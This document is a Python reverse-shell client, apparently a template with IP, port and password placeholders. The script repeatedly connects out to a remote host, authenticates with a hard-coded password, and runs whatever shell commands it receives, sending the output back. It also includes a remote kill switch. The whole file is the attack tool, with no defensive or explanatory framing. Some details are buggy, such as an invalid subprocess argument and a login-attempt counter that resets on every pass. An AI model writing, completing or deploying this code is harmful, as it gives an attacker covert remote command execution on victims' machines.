import subprocess, socket, os, threading

path = ''
cwd = ''

srvr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ip = '0.0.0.0' # IP-ENTRY
port = 25565 # PORT-ENTRY
killport = 25565 # KILL-PORT-ENTRY
pswd = 'password' # PASSWORD-ENTRY
maxPasswordTries = 3 # PASS-TRIES-ENTRY

def listenForKillSwitch():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	while True:
		try:
			s.connect((ip, killport))
			break
		except: continue
	while True:
		data = s.recv(1024)
		msg = data.decode()
		if msg == 'k_str': os._exit(0)
		else: continue

def recieve(s, buff=1024):
	data = b''
	while True:
		packet = s.recv(buff)
		data += packet
		if len(packet) < buff:
			break
	return data

def cd(newdir):
	global path, cwd
	path = os.path.normpath(f'{path}/{newdir}')
	cwd = os.path.abspath(path)

kthread = threading.Thread(target=listenForKillSwitch)
kthread.start()

while True:
	try:
		path = '.'
		cwd = os.path.abspath(path)

		while True: # try to connect until success
			try:
				srvr.connect((ip, port))
				break
			except: continue

		srvr.send(b'@LOGIN')

		while True: # login loop
			validateAttempts = 0

			if validateAttempts > maxPasswordTries: # check if user has tried to login too many times
				srvr.close()

			data = recieve(srvr) # decode recieve data
			msg = data.decode()

			if msg == pswd:
				srvr.send(b'@CONNECTED') # connection is established

				while True: # wait for connection confirmation
					data = recieve(srvr)
					msg = data.decode()
					if msg == '@CONFIRM-CONNECTION': break
					else: continue
				break # move on to request listener input

			else: # password is incorrect
				srvr.send(b'@DENIED')
				validateAttempts += 1
				continue

		while True:
			srvr.send(bytes(f'@GET-INPUT#({cwd})> ', 'utf-8')) # ask for listener input

			data = recieve(srvr) # decode recieve data
			msg = data.decode()

			if msg.find('@PRINT ') == 0 or msg.find('::p ') == 0: # PRINT command is issued
				print(msg[7:])
				continue

			elif msg.find('cd ') == 0: # cd command is issued
				cd(msg[3:])
				continue

			else: # shell command is issued
				try: msg = subprocess.call(msg, shell=True, captureOutput=True, cwd=cwd)
				except Exception as e: msg = f'ERROR:    {e}'
				data = bytes(msg, 'utf-8')
				srvr.send(data)
				continue

	except ConnectionResetError: continue # account for connection loss

	except Exception as e: # any other error
		msg = f'@ERROR-RESET{e}'
		continue